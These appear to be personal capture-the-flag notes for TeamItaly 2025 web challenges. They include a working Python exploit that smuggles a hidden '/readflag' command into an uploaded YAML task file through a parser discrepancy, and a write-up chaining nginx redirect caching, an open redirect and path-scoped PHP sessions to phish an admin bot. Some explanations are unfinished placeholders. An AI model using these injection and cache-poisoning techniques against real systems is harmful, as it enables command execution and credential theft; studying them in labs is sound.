---
tags: 
references:
---
# Active King
#svelte `__data.json`
`TeamItaly{7h3re_15_n0_5h0r7cu75!_0nly_h4rD_w0rK_5c36f4f5c7a32d65}`
# TaskRunner
#yam #parser
- task vs yaml parser diff https://github.com/eemeli/yaml/issues/595

exploit:
```python
#!/usr/bin/env python3
import requests
import json
import tempfile
import os

# Configuration
BASE_URL = "https://96cf5e742b547462.challenge02.it/"
USERNAME = "hacker1111111111111"
PASSWORD = "password1231111111111"
# template = "traceroute"
template = "date"

def login(session):
    login_data = {
        "username": USERNAME,
        "password": PASSWORD
    }
    
    response = session.post(f"{BASE_URL}/api/login", json=login_data)
    if response.status_code == 200:
        print(f"✓ Logged in successfully as {USERNAME}")
        return True
    else:
        print(f"✗ Login failed: {response.text}")
        return False

def create_disk_exploit_yaml():
    malicious_yaml = """version: 3
tasks:
  task:
    cmds:
      - date #\r      - /readflag
"""
    return malicious_yaml

def upload_malicious_file(session, yaml_content):
    """Upload the malicious YAML file"""
    global template
    with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
        f.write(yaml_content)
        temp_file = f.name
    
    try:
        with open(temp_file, 'rb') as f:
            files = {'file': ('malicious.yaml', f, 'text/yaml')}
            response = session.post(f"{BASE_URL}/api/upload?template={template}", files=files)
        
        if response.status_code == 200:
            file_id = response.json()['id']
            print(f"File uploaded successfully with ID: {file_id}")
            return file_id
        else:
            print(f"Upload failed: {response.text}")
            return None
    finally:
        os.unlink(temp_file)

def check_task(session, file_id):
    check_data = {"id": file_id}
    response = session.post(f"{BASE_URL}/api/check", json=check_data)
    
    if response.status_code == 200:
        print("Task validation passed")
        return True
    else:
        print(f"Task validation failed: {response.text}")
        return False

def execute_task(session, file_id):
    """Execute the malicious task"""
    execute_data = {"id": file_id}
    response = session.post(f"{BASE_URL}/api/execute", json=execute_data)
    
    if response.status_code == 200:
        print("Task execution started")
        return True
    else:
        print(f"Task execution failed: {response.text}")
        return False

def get_task_logs(session, file_id):
    """Get the task execution logs to see the flag"""
    import time
    
    time.sleep(3)
    
    response = session.get(f"{BASE_URL}/api/task/{file_id}")
    
    if response.status_code == 200:
        task_data = response.json()
        logs = task_data.get('logs', [])
        
        flag_found = False
        for i, log in enumerate(logs, 1):
            print(f"\nLog Entry #{i}:")
            print(f"   Status: {log['status']}")
            if log.get('output'):
                print(f"   Output:")
                output_lines = log['output'].split('\n')
                for line in output_lines:
                    if line.strip():
                        print(f"     {line}")
                
                # Look for the flag in the output
                if 'TeamItaly{' in log['output']:
                    print(f"\nFLAG FOUND!")
                    output_lines = log['output'].split('\n')
                    for line in output_lines:
                        if 'TeamItaly{' in line:
                            print(f"FLAG: {line.strip()}")
                            flag_found = True
        
        return flag_found
    else:
        return False

def main():
    session = requests.Session()
    
    if not login(session):
        return
    yaml_content = create_disk_exploit_yaml()
    file_id = upload_malicious_file(session, yaml_content)
    check_task(session, file_id)
    if execute_task(session, file_id):
        if not get_task_logs(session, file_id):
            print("\nFlag not found in output.")

if __name__ == "__main__":
    main()

```

flag: `TeamItaly{n0_w4y_7h4t's_A_s4fe_Ta5k_dce067d8}`

# TeamItaly25 - VibeChallenge (Unintended Solution)
Solves: 4
Tags: #cache-poisoning #openredirect #php
## Description
> A web challenge built on instinct, caffeine, and zero planning. Everything kind of works — and that’s good enough. Follow the vibes. Something might happen.
  
  [https://challenge03.it](https://challenge03.it)
## Overview
Simple website that allows to login, update the user bio and upload images.
## Road to flag
There's a bot that inserts the flag in its bio after navigating to a supplied url:
```php
$actions = [
        'browser' => 'chrome',
        'timeout' => 120,
        'actions' => [
            [ 'type' => 'request', 'url' => $_POST['url'], 'timeout' => 10 ],
            [
                'type' => 'sleep',
                'time' => 10
            ],
            // Register the account
            ['type' => 'request', 'url' => $CHALLENGE_URL . '/register.php', 'timeout' => 20 ],['type' => 'type','element' => 'input#username','value' => $username],['type' => 'click','element' => 'button#submit',],
            [
                'type' => 'sleep',
                'time' => 5
            ],
            // Insert the flag
            ['type' => 'request','url' => $CHALLENGE_URL . '/update_bio.php','timeout' => 20],
            ['type' => 'type','element' => 'textarea#bio','value' => $FLAG],['type' => 'click','element' => 'button#submit',]
        ]
    ];
```
## Code review
- Apache configuration
`mod_actions` is enabled, that allows to execute cgi-scripts ...explain...
```xml
<IfModule mod_actions.c>
    AddHandler php-cgi .php
    Action php-cgi /cgi-bin/php-cgi
</IfModule>
```
- nginx configuration:
caching is enabled for `/static` and `/image/uuid`. 302 redirects are cached.
`/image/uuid` is rewritten to `/image.php?id=uuid`.
```nginx
server {
    listen 80;

    add_header Content-Security-Policy "default-src 'self';" always;
    add_header X-Content-Type-Options nosniff always;

    location / {
        set $proxy_host ${BACKEND_HOST};
        proxy_pass http://$proxy_host:80;

        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }

    location /cgi-bin/ {
        deny all;
    }

    location ~ ^/image.php$ {
        deny all;
    }

    location /static/ {
        proxy_pass http://${BACKEND_HOST}:80;
        proxy_cache STATIC;
        proxy_cache_valid 200 302 10m;
        proxy_cache_valid 404      1m;
        proxy_cache_key "$scheme$proxy_host$request_uri";
        add_header X-Proxy-Cache $upstream_cache_status; 
        proxy_ignore_headers Set-Cookie Cache-Control Expires;
    }

    location ~ "^\/image\/([a-fA-F0-9]{8}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{4}-[a-fA-F0-9]{12})" {
        rewrite "^\/image\/(?<uuid>[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89ab][a-f0-9]{3}-[a-f0-9]{12})$" /image.php?id=$uuid break;
        proxy_pass http://${BACKEND_HOST}:80;
        proxy_cache STATIC;
        proxy_cache_valid 200 302 1m;
        proxy_cache_valid 404      1m;
        proxy_cache_key "$scheme$proxy_host$request_uri";
        add_header X-Proxy-Cache $upstream_cache_status; 
        proxy_hide_header Set-Cookie;
        proxy_ignore_headers Set-Cookie Cache-Control Expires;
    }
}
```

- session handling code
	there are some issues:
	- open redirect via *next* cookie, that it's possible to set for unauthenticated users
	- it's possible to set the scope of a session and have multiple sessions on the same site thanks to `   'path' => dirname($_SERVER['ORIG_PATH_INFO']), `
		- that means that an authenticated user can be deauthenticated on specific paths
		- `ORIG_PATH_INFO` in php is ...explain..

```php
// register.php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $username = trim($_POST["username"]);
    if ($username) {
        start_session();
        $_SESSION['user'] = $username;
        if ($_COOKIE['next']) {
            redirect($_COOKIE['next']); //! open redirect
            setcookie('next', '', -1, '/');
        } else {
            redirect('/');
        }
    }
}

// utils.php
function start_session(){
    $hardening_options = [
        'lifetime' => 6000,
        'path' => dirname($_SERVER['ORIG_PATH_INFO']), //! it's possible to set any path as the session scope
        'domain' => $_SERVER['HTTP_HOST'],
        'httponly' => true,  
    ];
    session_set_cookie_params($hardening_options);
    session_start();
}

function redirect($url){
    header('Location: ' . $url, replace:false);
}

// is_logged.php
if (!isset($_SESSION['user'])) {
    setcookie('next',  $_SERVER['ORIG_PATH_INFO'], path: "/"); //! if the user is not logged in, it's possible to set the next cookie with an arbitrary path
    redirect('/register.php');
    //! no return statement, the script will continue even if the user is not authenticated
} else if (isset($_COOKIE['next'])) {
    redirect($_COOKIE['next']); //! open redirect
    setcookie('next', '', -1, '/');
}
```
- the file upload and image handling code is solid
## Exploitation

1. Since redirects can be cached, I can poison an image response to return a redirect to any location by setting the *next* cookie -> openredirect
2. Since it's possible to set a session for any specific path `'path' => dirname($_SERVER['ORIG_PATH_INFO']),`, where the user will be logged out and it's possible to set the *next* cookie for an unauthenticated user, It's possible to set the next cookie even for authenticated users (because they are unauthenticated only on a path).
3. Authenticated users are always redirected if the *next* cookie is set

Knowing this, it's possible to redirect the bot after it logs in, and make it type the flag on the attacker's page. It's like phising the bot.


![[TIT25-vide.png]]

Explanation:
...

`TeamItaly{ch47gp7_54id_17_w45_f1n3_50_175_f1n3_1ce575c05a6b34b1}`